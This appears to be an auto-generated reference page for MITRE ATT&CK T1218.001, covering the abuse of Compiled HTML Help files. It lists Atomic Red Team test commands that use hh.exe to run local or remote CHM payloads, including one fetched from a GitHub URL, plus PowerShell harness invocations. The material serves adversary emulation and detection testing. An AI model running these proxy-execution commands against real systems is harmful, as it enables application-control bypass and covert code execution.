
# Compiled HTML File

## Description

### MITRE Description

> Adversaries may abuse Compiled HTML files (.chm) to conceal malicious code. CHM files are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)

A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application application control on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)

## Aliases

```

```

## Additional Attributes

* Bypass: ['Digital Certificate Validation', 'Application control']
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1218/001

## Potential Commands

```
Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath $env:windir\hh.exe -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath Test.chm
Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler its -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm
Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath Test.chm
Invoke-ATHCompiledHelp -ScriptEngine JScript -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
hh.exe PathToAtomicsFolder\T1218.001\src\T1218.001.chm
Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -HHFilePath $env:windir\hh.exe -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath $env:windir\hh.exe -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension html -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -InfoTechStorageHandler #{infotech_storage_handler} -HHFilePath #{hh_file_path} -CHMFilePath Test.chm
hh.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath $env:windir\hh.exe -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension html -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler its -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}
Invoke-ATHCompiledHelp -ExecuteShortcutCommand -InfoTechStorageHandler #{infotech_storage_handler} -TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} -CHMFilePath Test.chm
```

## Commands Dataset

```
[{'command': 'hh.exe PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm\n',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'hh.exe '
             'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm\n',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -HHFilePath #{hh_file_path} -CHMFilePath '
             'Test.chm',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -HHFilePath $env:windir\\hh.exe '
             '-CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -InfoTechStorageHandler '
             '#{infotech_storage_handler} -HHFilePath $env:windir\\hh.exe '
             '-CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -InfoTechStorageHandler its -HHFilePath '
             '#{hh_file_path} -CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -InfoTechStorageHandler '
             '#{infotech_storage_handler} -HHFilePath #{hh_file_path} '
             '-CHMFilePath Test.chm',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath '
             'Test.chm',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} '
             '-InfoTechStorageHandler #{infotech_storage_handler} '
             '-TopicExtension html -HHFilePath #{hh_file_path} -CHMFilePath '
             '#{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} '
             '-InfoTechStorageHandler #{infotech_storage_handler} '
             '-TopicExtension #{topic_extension} -HHFilePath '
             '$env:windir\\hh.exe -CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} '
             '-InfoTechStorageHandler its -TopicExtension #{topic_extension} '
             '-HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ScriptEngine JScript '
             '-InfoTechStorageHandler #{infotech_storage_handler} '
             '-TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} '
             '-CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ScriptEngine #{script_engine} '
             '-InfoTechStorageHandler #{infotech_storage_handler} '
             '-TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} '
             '-CHMFilePath Test.chm',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand '
             '-InfoTechStorageHandler #{infotech_storage_handler} '
             '-TopicExtension html -HHFilePath #{hh_file_path} -CHMFilePath '
             '#{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand '
             '-InfoTechStorageHandler #{infotech_storage_handler} '
             '-TopicExtension #{topic_extension} -HHFilePath '
             '$env:windir\\hh.exe -CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand '
             '-InfoTechStorageHandler its -TopicExtension #{topic_extension} '
             '-HHFilePath #{hh_file_path} -CHMFilePath #{chm_file_path}',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'},
 {'command': 'Invoke-ATHCompiledHelp -ExecuteShortcutCommand '
             '-InfoTechStorageHandler #{infotech_storage_handler} '
             '-TopicExtension #{topic_extension} -HHFilePath #{hh_file_path} '
             '-CHMFilePath Test.chm',
  'name': None,
  'source': 'atomics/T1218.001/T1218.001.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - Signed Binary Proxy Execution: Compiled HTML File': {'atomic_tests': [{'auto_generated_guid': '5cb87818-0d7c-4469-b7ef-9224107aebe8',
                                                                                                 'dependencies': [{'description': 'The '
                                                                                                                                  'payload '
                                                                                                                                  'must '
                                                                                                                                  'exist '
                                                                                                                                  'on '
                                                                                                                                  'disk '
                                                                                                                                  'at '
                                                                                                                                  'specified '
                                                                                                                                  'location '
                                                                                                                                  '(#{local_chm_file})\n',
                                                                                                                   'get_prereq_command': 'New-Item '
                                                                                                                                         '-Type '
                                                                                                                                         'Directory '
                                                                                                                                         '(split-path '
                                                                                                                                         '#{local_chm_file}) '
                                                                                                                                         '-ErrorAction '
                                                                                                                                         'ignore '
                                                                                                                                         '| '
                                                                                                                                         'Out-Null\n'
                                                                                                                                         'Invoke-WebRequest '
                                                                                                                                         '"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.001/src/T1218.001.chm" '
                                                                                                                                         '-OutFile '
                                                                                                                                         '"#{local_chm_file}"\n',
                                                                                                                   'prereq_command': 'if '
                                                                                                                                     '(Test-Path '
                                                                                                                                     '#{local_chm_file}) '
                                                                                                                                     '{exit '
                                                                                                                                     '0} '
                                                                                                                                     'else '
                                                                                                                                     '{exit '
                                                                                                                                     '1}\n'}],
                                                                                                 'dependency_executor_name': 'powershell',
                                                                                                 'description': 'Uses '
                                                                                                                'hh.exe '
                                                                                                                'to '
                                                                                                                'execute '
                                                                                                                'a '
                                                                                                                'local '
                                                                                                                'compiled '
                                                                                                                'HTML '
                                                                                                                'Help '
                                                                                                                'payload.\n'
                                                                                                                'Upon '
                                                                                                                'execution '
                                                                                                                'calc.exe '
                                                                                                                'will '
                                                                                                                'open\n',
                                                                                                 'executor': {'command': 'hh.exe '
                                                                                                                         '#{local_chm_file}\n',
                                                                                                              'name': 'command_prompt'},
                                                                                                 'input_arguments': {'local_chm_file': {'default': 'PathToAtomicsFolder\\T1218.001\\src\\T1218.001.chm',
                                                                                                                                        'description': 'Local '
                                                                                                                                                       '.chm '
                                                                                                                                                       'payload',
                                                                                                                                        'type': 'path'}},
                                                                                                 'name': 'Compiled '
                                                                                                         'HTML '
                                                                                                         'Help '
                                                                                                         'Local '
                                                                                                         'Payload',
                                                                                                 'supported_platforms': ['windows']},
                                                                                                {'auto_generated_guid': '0f8af516-9818-4172-922b-42986ef1e81d',
                                                                                                 'description': 'Uses '
                                                                                                                'hh.exe '
                                                                                                                'to '
                                                                                                                'execute '
                                                                                                                'a '
                                                                                                                'remote '
                                                                                                                'compiled '
                                                                                                                'HTML '
                                                                                                                'Help '
                                                                                                                'payload.\n'
                                                                                                                'Upon '
                                                                                                                'execution '
                                                                                                                'displays '
                                                                                                                'an '
                                                                                                                'error '
                                                                                                                'saying '
                                                                                                                'the '
                                                                                                                'file '
                                                                                                                'cannot '
                                                                                                                'be '
                                                                                                                'open\n',
                                                                                                 'executor': {'command': 'hh.exe '
                                                                                                                         '#{remote_chm_file}\n',
                                                                                                              'name': 'command_prompt'},
                                                                                                 'input_arguments': {'remote_chm_file': {'default': 'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.001/src/T1218.001.chm',
                                                                                                                                         'description': 'Remote '
                                                                                                                                                        '.chm '
                                                                                                                                                        'payload',
                                                                                                                                         'type': 'url'}},
                                                                                                 'name': 'Compiled '
                                                                                                         'HTML '
                                                                                                         'Help '
                                                                                                         'Remote '
                                                                                                         'Payload',
                                                                                                 'supported_platforms': ['windows']},
                                                                                                {'auto_generated_guid': '29d6f0d7-be63-4482-8827-ea77126c1ef7',
                                                                                                 'dependencies': [{'description': 'The '
                                                                                                                                  'AtomicTestHarnesses '
                                                                                                                                  'module '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'installed '
                                                                                                                                  'and '
                                                                                                                                  'Invoke-ATHCompiledHelp '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'exported '
                                                                                                                                  'in '
                                                                                                                                  'the '
                                                                                                                                  'module.',
                                                                                                                   'get_prereq_command': 'Install-Module '
                                                                                                                                         '-Name '
                                                                                                                                         'AtomicTestHarnesses '
                                                                                                                                         '-Scope '
                                                                                                                                         'CurrentUser '
                                                                                                                                         '-Force\n',
                                                                                                                   'prereq_command': '$RequiredModule '
                                                                                                                                     '= '
                                                                                                                                     'Get-Module '
                                                                                                                                     '-Name '
                                                                                                                                     'AtomicTestHarnesses '
                                                                                                                                     '-ListAvailable\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     '$RequiredModule) '
                                                                                                                                     '{exit '
                                                                                                                                     '1}\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     "$RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) "
                                                                                                                                     '{exit '
                                                                                                                                     '1} '
                                                                                                                                     'else '
                                                                                                                                     '{exit '
                                                                                                                                     '0}'}],
                                                                                                 'description': 'Executes '
                                                                                                                'a '
                                                                                                                'CHM '
                                                                                                                'file '
                                                                                                                'with '
                                                                                                                'the '
                                                                                                                'default '
                                                                                                                'Shortcut '
                                                                                                                'Command '
                                                                                                                'method.',
                                                                                                 'executor': {'command': 'Invoke-ATHCompiledHelp '
                                                                                                                         '-HHFilePath '
                                                                                                                         '#{hh_file_path} '
                                                                                                                         '-CHMFilePath '
                                                                                                                         '#{chm_file_path}',
                                                                                                              'name': 'powershell'},
                                                                                                 'input_arguments': {'chm_file_path': {'default': 'Test.chm',
                                                                                                                                       'description': 'Default '
                                                                                                                                                      'path '
                                                                                                                                                      'of '
                                                                                                                                                      'CHM',
                                                                                                                                       'type': 'string'},
                                                                                                                     'hh_file_path': {'default': '$env:windir\\hh.exe',
                                                                                                                                      'description': 'path '
                                                                                                                                                     'of '
                                                                                                                                                     'modified '
                                                                                                                                                     'HH.exe',
                                                                                                                                      'type': 'path'}},
                                                                                                 'name': 'Invoke '
                                                                                                         'CHM '
                                                                                                         'with '
                                                                                                         'default '
                                                                                                         'Shortcut '
                                                                                                         'Command '
                                                                                                         'Execution',
                                                                                                 'supported_platforms': ['windows']},
                                                                                                {'auto_generated_guid': 'b4094750-5fc7-4e8e-af12-b4e36bf5e7f6',
                                                                                                 'dependencies': [{'description': 'The '
                                                                                                                                  'AtomicTestHarnesses '
                                                                                                                                  'module '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'installed '
                                                                                                                                  'and '
                                                                                                                                  'Invoke-ATHCompiledHelp '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'exported '
                                                                                                                                  'in '
                                                                                                                                  'the '
                                                                                                                                  'module.',
                                                                                                                   'get_prereq_command': 'Install-Module '
                                                                                                                                         '-Name '
                                                                                                                                         'AtomicTestHarnesses '
                                                                                                                                         '-Scope '
                                                                                                                                         'CurrentUser '
                                                                                                                                         '-Force\n',
                                                                                                                   'prereq_command': '$RequiredModule '
                                                                                                                                     '= '
                                                                                                                                     'Get-Module '
                                                                                                                                     '-Name '
                                                                                                                                     'AtomicTestHarnesses '
                                                                                                                                     '-ListAvailable\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     '$RequiredModule) '
                                                                                                                                     '{exit '
                                                                                                                                     '1}\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     "$RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) "
                                                                                                                                     '{exit '
                                                                                                                                     '1} '
                                                                                                                                     'else '
                                                                                                                                     '{exit '
                                                                                                                                     '0}'}],
                                                                                                 'description': 'Executes '
                                                                                                                'a '
                                                                                                                'CHM '
                                                                                                                'file '
                                                                                                                'with '
                                                                                                                'the '
                                                                                                                'ITS '
                                                                                                                'protocol '
                                                                                                                'handler.',
                                                                                                 'executor': {'command': 'Invoke-ATHCompiledHelp '
                                                                                                                         '-InfoTechStorageHandler '
                                                                                                                         '#{infotech_storage_handler} '
                                                                                                                         '-HHFilePath '
                                                                                                                         '#{hh_file_path} '
                                                                                                                         '-CHMFilePath '
                                                                                                                         '#{chm_file_path}',
                                                                                                              'name': 'powershell'},
                                                                                                 'input_arguments': {'chm_file_path': {'default': 'Test.chm',
                                                                                                                                       'description': 'Default '
                                                                                                                                                      'path '
                                                                                                                                                      'of '
                                                                                                                                                      'CHM',
                                                                                                                                       'type': 'string'},
                                                                                                                     'hh_file_path': {'default': '$env:windir\\hh.exe',
                                                                                                                                      'description': 'path '
                                                                                                                                                     'of '
                                                                                                                                                     'modified '
                                                                                                                                                     'HH.exe',
                                                                                                                                      'type': 'path'},
                                                                                                                     'infotech_storage_handler': {'default': 'its',
                                                                                                                                                  'description': 'Default '
                                                                                                                                                                 'InfoTech '
                                                                                                                                                                 'Storage '
                                                                                                                                                                 'Protocol '
                                                                                                                                                                 'Handler',
                                                                                                                                                  'type': 'string'}},
                                                                                                 'name': 'Invoke '
                                                                                                         'CHM '
                                                                                                         'with '
                                                                                                         'InfoTech '
                                                                                                         'Storage '
                                                                                                         'Protocol '
                                                                                                         'Handler',
                                                                                                 'supported_platforms': ['windows']},
                                                                                                {'auto_generated_guid': '5decef42-92b8-4a93-9eb2-877ddcb9401a',
                                                                                                 'dependencies': [{'description': 'The '
                                                                                                                                  'AtomicTestHarnesses '
                                                                                                                                  'module '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'installed '
                                                                                                                                  'and '
                                                                                                                                  'Invoke-ATHCompiledHelp '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'exported '
                                                                                                                                  'in '
                                                                                                                                  'the '
                                                                                                                                  'module.',
                                                                                                                   'get_prereq_command': 'Install-Module '
                                                                                                                                         '-Name '
                                                                                                                                         'AtomicTestHarnesses '
                                                                                                                                         '-Scope '
                                                                                                                                         'CurrentUser '
                                                                                                                                         '-Force\n',
                                                                                                                   'prereq_command': '$RequiredModule '
                                                                                                                                     '= '
                                                                                                                                     'Get-Module '
                                                                                                                                     '-Name '
                                                                                                                                     'AtomicTestHarnesses '
                                                                                                                                     '-ListAvailable\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     '$RequiredModule) '
                                                                                                                                     '{exit '
                                                                                                                                     '1}\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     "$RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) "
                                                                                                                                     '{exit '
                                                                                                                                     '1} '
                                                                                                                                     'else '
                                                                                                                                     '{exit '
                                                                                                                                     '0}'}],
                                                                                                 'description': 'Executes '
                                                                                                                'a '
                                                                                                                'CHM '
                                                                                                                'file '
                                                                                                                'simulating '
                                                                                                                'a '
                                                                                                                'user '
                                                                                                                'double '
                                                                                                                'click.',
                                                                                                 'executor': {'command': 'Invoke-ATHCompiledHelp '
                                                                                                                         '-SimulateUserDoubleClick '
                                                                                                                         '-CHMFilePath '
                                                                                                                         '#{chm_file_path}',
                                                                                                              'name': 'powershell'},
                                                                                                 'input_arguments': {'chm_file_path': {'default': 'Test.chm',
                                                                                                                                       'description': 'Default '
                                                                                                                                                      'path '
                                                                                                                                                      'of '
                                                                                                                                                      'CHM',
                                                                                                                                       'type': 'string'}},
                                                                                                 'name': 'Invoke '
                                                                                                         'CHM '
                                                                                                         'Simulate '
                                                                                                         'Double '
                                                                                                         'click',
                                                                                                 'supported_platforms': ['windows']},
                                                                                                {'auto_generated_guid': '4f83adda-f5ec-406d-b318-9773c9ca92e5',
                                                                                                 'dependencies': [{'description': 'The '
                                                                                                                                  'AtomicTestHarnesses '
                                                                                                                                  'module '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'installed '
                                                                                                                                  'and '
                                                                                                                                  'Invoke-ATHCompiledHelp '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'exported '
                                                                                                                                  'in '
                                                                                                                                  'the '
                                                                                                                                  'module.',
                                                                                                                   'get_prereq_command': 'Install-Module '
                                                                                                                                         '-Name '
                                                                                                                                         'AtomicTestHarnesses '
                                                                                                                                         '-Scope '
                                                                                                                                         'CurrentUser '
                                                                                                                                         '-Force\n',
                                                                                                                   'prereq_command': '$RequiredModule '
                                                                                                                                     '= '
                                                                                                                                     'Get-Module '
                                                                                                                                     '-Name '
                                                                                                                                     'AtomicTestHarnesses '
                                                                                                                                     '-ListAvailable\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     '$RequiredModule) '
                                                                                                                                     '{exit '
                                                                                                                                     '1}\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     "$RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) "
                                                                                                                                     '{exit '
                                                                                                                                     '1} '
                                                                                                                                     'else '
                                                                                                                                     '{exit '
                                                                                                                                     '0}'}],
                                                                                                 'description': 'Executes '
                                                                                                                'a '
                                                                                                                'CHM '
                                                                                                                'file '
                                                                                                                'with '
                                                                                                                'a '
                                                                                                                'defined '
                                                                                                                'script '
                                                                                                                'engine, '
                                                                                                                'ITS '
                                                                                                                'Protocol '
                                                                                                                'Handler, '
                                                                                                                'and '
                                                                                                                'help '
                                                                                                                'topic '
                                                                                                                'extension.',
                                                                                                 'executor': {'command': 'Invoke-ATHCompiledHelp '
                                                                                                                         '-ScriptEngine '
                                                                                                                         '#{script_engine} '
                                                                                                                         '-InfoTechStorageHandler '
                                                                                                                         '#{infotech_storage_handler} '
                                                                                                                         '-TopicExtension '
                                                                                                                         '#{topic_extension} '
                                                                                                                         '-HHFilePath '
                                                                                                                         '#{hh_file_path} '
                                                                                                                         '-CHMFilePath '
                                                                                                                         '#{chm_file_path}',
                                                                                                              'name': 'powershell'},
                                                                                                 'input_arguments': {'chm_file_path': {'default': 'Test.chm',
                                                                                                                                       'description': 'Default '
                                                                                                                                                      'path '
                                                                                                                                                      'of '
                                                                                                                                                      'CHM',
                                                                                                                                       'type': 'string'},
                                                                                                                     'hh_file_path': {'default': '$env:windir\\hh.exe',
                                                                                                                                      'description': 'path '
                                                                                                                                                     'of '
                                                                                                                                                     'modified '
                                                                                                                                                     'HH.exe',
                                                                                                                                      'type': 'path'},
                                                                                                                     'infotech_storage_handler': {'default': 'its',
                                                                                                                                                  'description': 'Default '
                                                                                                                                                                 'InfoTech '
                                                                                                                                                                 'Storage '
                                                                                                                                                                 'Protocol '
                                                                                                                                                                 'Handler',
                                                                                                                                                  'type': 'string'},
                                                                                                                     'script_engine': {'default': 'JScript',
                                                                                                                                       'description': 'Default '
                                                                                                                                                      'Script '
                                                                                                                                                      'Engine',
                                                                                                                                       'type': 'string'},
                                                                                                                     'topic_extension': {'default': 'html',
                                                                                                                                         'description': 'Default '
                                                                                                                                                        'Help '
                                                                                                                                                        'Topic',
                                                                                                                                         'type': 'string'}},
                                                                                                 'name': 'Invoke '
                                                                                                         'CHM '
                                                                                                         'with '
                                                                                                         'Script '
                                                                                                         'Engine '
                                                                                                         'and '
                                                                                                         'Help '
                                                                                                         'Topic',
                                                                                                 'supported_platforms': ['windows']},
                                                                                                {'auto_generated_guid': '15756147-7470-4a83-87fb-bb5662526247',
                                                                                                 'dependencies': [{'description': 'The '
                                                                                                                                  'AtomicTestHarnesses '
                                                                                                                                  'module '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'installed '
                                                                                                                                  'and '
                                                                                                                                  'Invoke-ATHCompiledHelp '
                                                                                                                                  'must '
                                                                                                                                  'be '
                                                                                                                                  'exported '
                                                                                                                                  'in '
                                                                                                                                  'the '
                                                                                                                                  'module.',
                                                                                                                   'get_prereq_command': 'Install-Module '
                                                                                                                                         '-Name '
                                                                                                                                         'AtomicTestHarnesses '
                                                                                                                                         '-Scope '
                                                                                                                                         'CurrentUser '
                                                                                                                                         '-Force\n',
                                                                                                                   'prereq_command': '$RequiredModule '
                                                                                                                                     '= '
                                                                                                                                     'Get-Module '
                                                                                                                                     '-Name '
                                                                                                                                     'AtomicTestHarnesses '
                                                                                                                                     '-ListAvailable\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     '$RequiredModule) '
                                                                                                                                     '{exit '
                                                                                                                                     '1}\n'
                                                                                                                                     'if '
                                                                                                                                     '(-not '
                                                                                                                                     "$RequiredModule.ExportedCommands['Invoke-ATHCompiledHelp']) "
                                                                                                                                     '{exit '
                                                                                                                                     '1} '
                                                                                                                                     'else '
                                                                                                                                     '{exit '
                                                                                                                                     '0}'}],
                                                                                                 'description': 'Executes '
                                                                                                                'a '
                                                                                                                'CHM '
                                                                                                                'file '
                                                                                                                'using '
                                                                                                                'the '
                                                                                                                'Shortcut '
                                                                                                                'Command '
                                                                                                                'method '
                                                                                                                'with '
                                                                                                                'a '
                                                                                                                'defined '
                                                                                                                'ITS '
                                                                                                                'Protocol '
                                                                                                                'Handler, '
                                                                                                                'and '
                                                                                                                'help '
                                                                                                                'topic '
                                                                                                                'extension.',
                                                                                                 'executor': {'command': 'Invoke-ATHCompiledHelp '
                                                                                                                         '-ExecuteShortcutCommand '
                                                                                                                         '-InfoTechStorageHandler '
                                                                                                                         '#{infotech_storage_handler} '
                                                                                                                         '-TopicExtension '
                                                                                                                         '#{topic_extension} '
                                                                                                                         '-HHFilePath '
                                                                                                                         '#{hh_file_path} '
                                                                                                                         '-CHMFilePath '
                                                                                                                         '#{chm_file_path}',
                                                                                                              'name': 'powershell'},
                                                                                                 'input_arguments': {'chm_file_path': {'default': 'Test.chm',
                                                                                                                                       'description': 'Default '
                                                                                                                                                      'path '
                                                                                                                                                      'of '
                                                                                                                                                      'CHM',
                                                                                                                                       'type': 'string'},
                                                                                                                     'hh_file_path': {'default': '$env:windir\\hh.exe',
                                                                                                                                      'description': 'path '
                                                                                                                                                     'of '
                                                                                                                                                     'modified '
                                                                                                                                                     'HH.exe',
                                                                                                                                      'type': 'path'},
                                                                                                                     'infotech_storage_handler': {'default': 'its',
                                                                                                                                                  'description': 'Default '
                                                                                                                                                                 'InfoTech '
                                                                                                                                                                 'Storage '
                                                                                                                                                                 'Protocol '
                                                                                                                                                                 'Handler',
                                                                                                                                                  'type': 'string'},
                                                                                                                     'topic_extension': {'default': 'html',
                                                                                                                                         'description': 'Default '
                                                                                                                                                        'Help '
                                                                                                                                                        'Topic',
                                                                                                                                         'type': 'string'}},
                                                                                                 'name': 'Invoke '
                                                                                                         'CHM '
                                                                                                         'Shortcut '
                                                                                                         'Command '
                                                                                                         'with '
                                                                                                         'ITS '
                                                                                                         'and '
                                                                                                         'Help '
                                                                                                         'Topic',
                                                                                                 'supported_platforms': ['windows']}],
                                                                               'attack_technique': 'T1218.001',
                                                                               'display_name': 'Signed '
                                                                                               'Binary '
                                                                                               'Proxy '
                                                                                               'Execution: '
                                                                                               'Compiled '
                                                                                               'HTML '
                                                                                               'File'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Restrict Web-Based Content](../mitigations/Restrict-Web-Based-Content.md)

* [Execution Prevention](../mitigations/Execution-Prevention.md)
    

# Actors


* [Lazarus Group](../actors/Lazarus-Group.md)

* [Dark Caracal](../actors/Dark-Caracal.md)
    
* [OilRig](../actors/OilRig.md)
    
* [Silence](../actors/Silence.md)
    
* [APT41](../actors/APT41.md)
    
